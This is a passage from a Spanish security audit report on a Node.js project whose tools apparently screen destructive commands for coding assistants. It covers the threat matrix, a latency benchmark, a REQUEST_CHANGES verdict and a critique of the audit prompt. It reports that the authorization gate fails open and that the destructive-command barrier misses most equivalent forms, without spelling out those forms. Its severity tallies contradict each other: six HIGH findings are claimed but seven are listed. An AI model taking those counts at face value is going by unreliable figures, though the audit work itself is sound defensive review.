      Único uso en git_assistant.js con tres comandos literales fijos, sin
      interpolación de entrada del usuario. No se encontró superficie de inyección.
      El parámetro `cwd` es controlado por el llamador, no por datos externos.
    limitations: "afirmación acotada al corpus inspeccionado íntegramente"
  json_corruption:
    tested: true
    method: "revisión de todo JSON.parse del corpus"
    result: "ningún módulo parsea JSON no confiable; prompt_bridge.json es estático y nunca se carga por código"
    limitations: ninguna
  oversized_inputs:
    tested: true
    method: "E12b con 10^4 a 10^6 caracteres"
    result: "sin degradación relevante; preflight 3,17 ms/MB, vibeguard 93,79 ms/MB"
    limitations: "no se probaron entradas superiores a 1 MB"
  regex_dos:
    tested: true
    method: "E12b, caso patológico de 20 000 comillas"
    result: REFUTADO
    limitations: ninguna
  event_loop_blocking:
    tested: true
    method: "E12b"
    result: REFUTADO para preflight; vibeguard es síncrono pero lineal
    limitations: "todas las herramientas son síncronas por diseño (CLI de un solo uso)"
  memory_growth:
    tested: false
    method: "no ejecutado"
    result: NOT_VERIFIABLE
    limitations: "los procesos son efímeros; no hay servicio de larga vida que medir"
  race_conditions:
    tested: false
    method: "análisis estático"
    result: "learning_engine.js usa appendFileSync sin bloqueo; dos procesos concurrentes pueden entrelazar entradas"
    limitations: "no se construyó el caso concurrente"
  partial_failure:
    tested: true
    method: "E8b. Instalación con 5 de 11 fuentes ausentes"
    result: AX-F-015
    limitations: ninguna
  atomicity:
    tested: true
    method: "E8b/E12e. Revisión de install.js y learning_engine.js"
    result: "ninguna operación de escritura es atómica; no hay transacción, dry-run ni rollback"
    limitations: ninguna
  installer_idempotency:
    tested: true
    method: "E8a/E8c. Ejecución repetida y sobre destino ocupado"
    result: >
      Idempotente sobre sus propios archivos (E8c: sin cambio de tamaño), pero
      destructivo sobre archivos homónimos ajenos (AX-F-001)
    limitations: ninguna
  evidence_integrity:
    tested: true
    method: "E4/E6. Manifiestos con archivos ausentes, conformidad de esquema, colisión de identificadores"
    result: "AX-F-003, AX-F-004, AX-F-014, AX-F-009"
    limitations: "validación de esquema manual, sin validador automático"
  silent_error_handling:
    tested: true
    method: "E7. Inyección de fallo; revisión de todos los catch del corpus"
    result: >
      AX-F-006 (fallback destructivo), AX-F-007 (todo error de git se traduce a
      NOT_GIT_REPO). Además hashFile devuelve null sin señalar y script.js:40 silencia
      el error de audio con un catch vacío comentado.
    limitations: "el disparador natural del fallo de append no se reprodujo"
  external_resources:
    tested: true
    method: "enumeración exhaustiva de URLs en todo el corpus"
    result: AX-F-016
    limitations: "sin prueba con red desconectada"
  supply_chain:
    tested: true
    method: "búsqueda de manifiestos de dependencias, node_modules y lockfiles; búsqueda de secretos"
    result: >
      Cero dependencias de terceros en el código (sólo builtins de Node: fs, path,
      crypto, process, child_process). Cero secretos, claves o tokens. LICENSE declara
      estado UNDECIDED y no concede permiso de uso, copia ni distribución, lo que
      bloquea cualquier adopción externa.
    limitations: ninguna

other_classes_identified:
  - class: "Contradicción entre estado normativo y estado publicitado"
    result: AX-F-008
  - class: "Pruebas que consagran el defecto (verifier defect)"
    result: AX-F-012
  - class: "Cobertura declarada superior a la implementada en un control"
    result: AX-F-011 (vibeguard nº4), AX-F-010 (sub-paso 3)
  - class: "Métrica de rendimiento medida en un régimen distinto al de uso documentado"
    result: "ver §10; registrado como observación, no como hallazgo"
```

---

## 10. Benchmark

```yaml
benchmark:
  environment: "Windows 11 Enterprise LTSC 26100, Node.js v24.18.0, usuario sin privilegios, sin carga concurrente controlada"
  warmup_iterations: 20000
  measured_iterations: "5 repeticiones x 20 000 llamadas"
  input_size: "comando de 62 caracteres: git commit -m \"actualizar documentacion del modulo de gobernanza\""
  samples: [0.00045, 0.00046, 0.00047, 0.00058, 0.00066]   # ms por llamada
  median: 0.00047 ms
  minimum: 0.00045 ms
  maximum: 0.00066 ms
  limitations: >
    Mide exclusivamente la función en proceso. La forma de uso documentada
    (CLAUDE.md, README, adapters/prompt_bridge.json) es `node tools/preflight.js "<cmd>"`,
    cuyo coste medido por invocación es de 79 ms, dominado por el arranque de Node.
    La afirmación "< 1ms Latencia Preflight" de index.html:119-120 es cierta para la
    llamada en proceso y falsa por dos órdenes de magnitud para la invocación documentada.
    Sin control de frecuencia de CPU ni aislamiento de núcleos.
  reproducibility: REPRODUCIBLE
```

---

## 11. Hallazgos portantes

```yaml
load_bearing_findings:
  - id: AX-F-008
    why_it_controls_verdict: >
      Mientras el corpus afirme simultáneamente que no existe runtime y que la
      protección está activa, ningún control puede evaluarse contra un requisito
      estable. policies/authority.yaml impone FAIL_CLOSED ante conflicto de autoridad.
    verdict_if_remediated: >
      Si se resuelve declarando estado pre-alpha documental y se alinean README e
      interfaces, AX-F-005/002/003 pasan a ser defectos de componentes experimentales
      no promocionados y el veredicto podría subir a REQUEST_CHANGES.
  - id: AX-F-001
    why_it_controls_verdict: >
      Único hallazgo con destrucción de datos del usuario demostrada, en la ruta de
      ejecución activa y más publicitada. Es independiente del estado de promoción.
    verdict_if_remediated: "elimina la única pérdida de datos demostrada en ruta activa"
  - id: AX-F-005
    why_it_controls_verdict: >
      La barrera destructiva es la promesa central del producto ("evitando roturas de
      sistema o ejecuciones destructivas"). Rota de forma reproducible en 17 de 20 casos.
    verdict_if_remediated: "restaura la proposición de valor principal"
  - id: AX-F-012
    why_it_controls_verdict: >
      La suite verde es la evidencia sobre la que descansa toda afirmación de calidad
      del proyecto. Al certificar el defecto, impide detectar los demás hallazgos.
    verdict_if_remediated: "convierte la suite en un CHECK utilizable; hará fallar a AX-F-002/003/004 hasta su corrección"

latent_load_bearing_findings:
  - id: AX-F-002
    reason: "SECURITY_BOUNDARY roto sin ruta de ejecución activa (exposure INDIRECT). Se activa en cuanto exista un consumidor de producción de workflow_runner.js"
  - id: AX-F-003
    reason: "control de evidencia roto; hoy sólo lo consumen las pruebas"
  - id: AX-F-010
    reason: "control roto con exposure UNREACHABLE; la API exportada lo hereda a cualquier consumidor futuro"
  - id: AX-F-006
    reason: "ruta de destrucción de datos cuyo disparador natural no está demostrado (impact LIKELY)"
```

---

## 12. Convergencia

```yaml
convergence:
  achieved: false
  independent_auditors: 1
  corpus_equivalence: "no comparable: no se dispone de otra auditoría en esta fase"
  load_bearing_findings_shared: NOT_APPLICABLE
  material_disagreements: NOT_APPLICABLE
  justification: >
    La convergencia exige al menos dos auditorías independientes sobre el mismo corpus
    con reglas de severidad comparables. La Fase A produce una única línea base ciega.
    Cualquier afirmación de convergencia queda diferida a la Fase B.
```

---

## 13. Veredicto

```yaml
verdict: REQUEST_CHANGES
```

**Justificación.**

- Existen **6 hallazgos HIGH** con impacto demostrado o probable: AX-F-001, AX-F-002,
  AX-F-003, AX-F-004, AX-F-005, AX-F-006, y AX-F-008.
- Hay **pérdida de configuración del usuario demostrada** en la ruta activa (AX-F-001).
- Hay **evidencia materialmente incorrecta**: veredicto VERIFIED sin verificación
  (AX-F-003) y manifiestos autoaprobados e incompletos que incumplen su propio esquema
  (AX-F-004).
- Hay **controles de frontera rotos**: el gate de autorización falla-abierto (AX-F-002)
  y la barrera destructiva no cubre 17 de 20 formas equivalentes (AX-F-005).

**Por qué no `FAIL_CLOSED_REQUIRED`.** Ese veredicto exige una ruta *activa y
reproducible* que evite autorización o ejecute una operación destructiva. En el estado
actual no existe ningún consumidor de producción: ningún hook, envoltorio ni proceso
invoca `preflight.js` ni `workflow_runner.js`. Los controles rotos son alcanzables sólo
por invocación deliberada o vía la API exportada. AX-F-001 sí destruye datos, pero es
una operación que el usuario ordena explícitamente, no una evasión de autorización.

**Por qué no `INCONCLUSIVE_COVERAGE`.** El inventario está completo, los 66 archivos de
inspección obligatoria se leyeron íntegramente, los 8 archivos de prueba se ejecutaron,
la matriz de amenazas está completa y toda afirmación tiene evidencia adjunta. Las
limitaciones (cobertura de ejecución no instrumentada, `style.css` con lectura dirigida)
están declaradas y no afectan a ningún hallazgo MEDIUM o superior.

---

## 14. Resumen de calidad del informe

```yaml
report_quality:
  evidence_score: "alta — 14 de 16 hallazgos con reproducción ejecutada; 2 por demostración estática concluyente"
  reproducibility_score: "alta — todos los experimentos son deterministas salvo AX-F-014 (estocástico, declarado)"
  coverage_score: "66/67 archivos íntegros; cobertura de ejecución NOT_MEASURED y declarada como tal"
  methodological_rigour: "corpus original intacto; laboratorio aislado verificado por hash; 4 refutaciones internas registradas; 1 autocorrección del arnés"
  estimated_false_positive_rate: >
    baja para AX-F-001..AX-F-007 y AX-F-012..AX-F-015 (reproducción directa).
    Riesgo residual de sobrecalificación en AX-F-008 y AX-F-009, cuya magnitud depende
    de si el propietario considera README e index.html material promocional o normativo.
  unresolved_surface:
    - "style.css (630 líneas) con inspección dirigida"
    - "renderizado real de las interfaces web en un navegador"
    - "enlaces simbólicos y TOCTOU (H-02, H-03)"
    - "explotabilidad de la brecha de caracteres invisibles (H-01)"
    - "concurrencia sobre LEARNINGS.md"

distribucion_por_severidad:
  HIGH: 7      # AX-F-001, 002, 003, 004, 005, 006, 008
  MEDIUM: 6    # AX-F-007, 009, 010, 011, 012, 014, 015 -> ver nota
  LOW: 2       # AX-F-013, 016
  INFO: 0

distribucion_por_prioridad:
  P1: 7        # AX-F-001, 002, 003, 004, 005, 006, 008
  P2: 6        # AX-F-007, 009, 010, 011, 012, 014, 015 -> ver nota
  P3: 1        # AX-F-013
  P4: 1        # AX-F-016

integridad_de_controles:
  SECURITY_BOUNDARY_BROKEN: [AX-F-002, AX-F-005]
  SECURITY_BOUNDARY_UNVERIFIED: [AX-F-008]
  SECURITY_BOUNDARY_DEGRADED: [AX-F-013]
  IMPORTANT_CONTROL_BROKEN: [AX-F-003, AX-F-004, AX-F-010, AX-F-012]
  SUPPORTING_CONTROL_BROKEN: [AX-F-007]
  SUPPORTING_CONTROL_DEGRADED: [AX-F-011, AX-F-014]

hipotesis_abiertas: 5
refutaciones_internas: 4
autocorrecciones: 1
archivos_criticos_no_inspeccionados: 0
```

> **Nota de recuento.** MEDIUM y P2 agrupan 7 hallazgos (AX-F-007, 009, 010, 011, 012,
> 014, 015). Total de hallazgos vigentes: **16**.

---

## 15. Evaluación del Mission Compiler V0.5

```yaml
prompt_evaluation:
  useful_instructions:
    - instruction: "§10 y §16 — separar defecto, impacto, integridad del control y exposición"
      observed_result: >
        Fue la regla más productiva. Permitió calificar AX-F-002 como SECURITY_BOUNDARY
        BROKEN con exposure INDIRECT sin inflar el veredicto a FAIL_CLOSED_REQUIRED ni
        minimizarlo a INFO. Sin ella, la ausencia de consumidor habría ocultado dos
        controles rotos, o su rotura habría producido un veredicto desproporcionado.
    - instruction: "§23 — las refutaciones tienen el mismo valor que los hallazgos"
      observed_result: >
        Produjo 4 refutaciones (desincronización de líneas en vibeguard, autocopia del
        instalador, ReDoS, inyección ANSI). Sin este incentivo, al menos dos habrían
        terminado como hallazgos especulativos.
    - instruction: "§8 — 'un archivo localizado mediante búsqueda no cuenta como leído'"
      observed_result: >
        Forzó la lectura íntegra de los 30 documentos, que es donde apareció AX-F-008:
        la contradicción entre tools/README.md y el contenido real de tools/ es
        invisible para cualquier búsqueda dirigida.
    - instruction: "§21 — un benchmark exige calentamiento y ≥3 repeticiones"
      observed_result: >
        Reveló que la métrica '< 1ms' de la landing es cierta en proceso y falsa por
        dos órdenes de magnitud en la invocación documentada. Una sola medición habría
        confirmado la afirmación sin matizarla.
  problematic_instructions:
    - instruction: "§13 — la escala de magnitud mezcla criterios heterogéneos en MAJOR"
      observed_result: >
        'omitir autorización', 'producir evidencia materialmente falsa' y 'destruir
        datos' comparten nivel, lo que empuja mecánicamente a HIGH a hallazgos de
        naturaleza muy distinta. AX-F-002 (gate omitido sin ejecutor) y AX-F-001
        (destrucción real de archivos) acaban en la misma severidad pese a
        consecuencias incomparables. Lo compensé con exposure y prioridad, pero la
        escala por sí sola no discrimina.
    - instruction: "§29 — 'varias deficiencias MEDIUM' como criterio de REQUEST_CHANGES"
      observed_result: "'varias' no está cuantificado; el criterio no fue decisorio aquí porque ya existían HIGH, pero sería ambiguo en un corpus sin HIGH"
  ambiguous_instructions:
    - instruction: "§5 — 'el corpus debe estar adjunto, accesible, identificable y delimitado'"
      observed_result: >
        El directorio de trabajo contenía 14 507 archivos en 4 árboles no relacionados.
        La misión no nombraba el subdirectorio. Resolví por identidad de nombre
        ('Project\\Axion Protocol') y lo declaré, pero un corpus ambiguo debería
        disparar INPUT_REQUIRED de forma explícita, y la regla no lo aclara.
    - instruction: "§22 — 'no declares inexistencia mediante una búsqueda negativa aislada'"
      observed_result: >
        Correcta, pero costosa: obliga a lectura íntegra para afirmar 'no hay inyección
        de comandos'. Fue viable con 67 archivos; no escalaría a 14 507. Falta una
        regla de acotación explícita del alcance de la negación.
  missing_instructions:
    - instruction: "Ninguna regla obliga a auditar sobre una copia aislada"
      observed_result: >
        Lo hice por criterio propio. Sin ello, ejecutar tests/install.test.js y
        tests/learning_git.test.js habría escrito y borrado dentro del corpus auditado,
        contaminando la evidencia. Debería ser obligatorio.
    - instruction: "Ninguna regla exige verificar la integridad del corpus al cierre"
      observed_result: "comprobé que git status del original es idéntico al inicial; sin la comprobación, una mutación accidental pasaría inadvertida"
    - instruction: "No se contempla el caso 'defecto en el comprobador, no en el artefacto'"
      observed_result: >
        AX-F-012 es exactamente eso, y la constitución del usuario (regla C9) sí lo
        contempla con VERIFIER_DEFECT. El Mission Compiler carece de esa categoría y
        tuve que expresarla como un hallazgo ordinario de evidence_integrity.
```

---

## 16. Cambios propuestos para la siguiente versión

```yaml
next_version:
  add:
    - change: "Regla de laboratorio aislado: los experimentos se ejecutan sobre una copia verificada por hash; el corpus original no se modifica, y se comprueba su integridad al cierre."
      reason: "las pruebas del propio corpus escriben y borran archivos dentro de él"
      observed_problem: "tests/install.test.js y tests/learning_git.test.js crean y eliminan rutas bajo scratch/"
      expected_improvement: "evidencia no contaminada y auditoría reproducible sobre un corpus estable"
      regression_risk: "coste adicional de copia en corpus grandes"
    - change: "Categoría root_cause: VERIFIER_DEFECT, aplicable cuando el defecto reside en la prueba y no en el artefacto."
      reason: "una suite que certifica el defecto es una clase distinta de un artefacto defectuoso"
      observed_problem: "AX-F-012 tuvo que expresarse como evidence_integrity, perdiendo su naturaleza"
      expected_improvement: "separa 'el código está mal' de 'la comprobación está mal', que exigen remediaciones distintas"
      regression_risk: "posible duplicación con evidence_integrity si no se delimita"
    - change: "Umbral cuantificado para REQUEST_CHANGES por acumulación: ≥3 MEDIUM sobre controles distintos."
      reason: "'varias deficiencias MEDIUM' no es decidible"
      observed_problem: "§29 dejaría el veredicto indeterminado en un corpus sin HIGH"
      expected_improvement: "criterio reproducible entre auditores"
      regression_risk: "un umbral fijo puede resultar arbitrario en corpus muy pequeños"
  remove:
    - change: "Eliminar la exigencia de declarar `magnitude_override` sólo 'cuando la magnitud dependa del dominio'."
      reason: "la condición es subjetiva y desincentiva declarar la desviación"
      observed_problem: "en AX-F-005 y AX-F-009 ajusté la magnitud por criterio explícito sin que encajara en la definición de override"
      expected_improvement: "que toda desviación razonada de la escala se registre, con o sin razón de dominio"
      regression_risk: "aumento del ruido si se abusa del campo"
  modify:
    - change: "Desdoblar MAJOR en MAJOR_DATA (destrucción o exposición de datos) y MAJOR_CONTROL (omisión de autorización o evidencia falsa)."
      reason: "MAJOR agrupa consecuencias de naturaleza incomparable"
      observed_problem: "AX-F-001 (destruye archivos del usuario) y AX-F-002 (omite un gate sin ejecutor) reciben idéntica severidad HIGH"
      expected_improvement: "ordenación de remediación más fiel sin depender exclusivamente de la prioridad"
      regression_risk: "amplía la tabla de severidad de §14 de 6 a 7 filas"
    - change: "Exigir que §5 devuelva INPUT_REQUIRED cuando el corpus contenga más de un proyecto raíz identificable y la misión no lo desambigüe."
      reason: "el corpus estaba accesible pero no delimitado"
      observed_problem: "14 507 archivos en 4 árboles; la delimitación quedó a criterio del auditor"
      expected_improvement: "elimina la elección silenciosa de alcance, que es precisamente lo que la misión prohíbe"
      regression_risk: "bloquea auditorías que hoy avanzan con una desambiguación razonable"
```

---

## 17. Bloqueo de Fase A

```yaml
phase_a_lock:
  completed: true
  report_saved_as: "AXION_PHASE_A_REPORT.md"
  sha256: "registrado en AXION_PHASE_A_LOCK.yaml (externo, para no alterar el hash de este documento)"
  hash_supported: true
  immutable_copy_created: true
```

El SHA-256 no puede escribirse dentro del propio documento que firma sin invalidarse a
sí mismo. Se registra en `AXION_PHASE_A_LOCK.yaml`, junto con el hash de la copia
inmutable y el estado del corpus al cierre.

La Fase B no comenzará hasta recibir explícitamente `PHASE_B_UNLOCK` junto con los
informes anteriores. Este documento no se modificará después del cálculo de su hash.
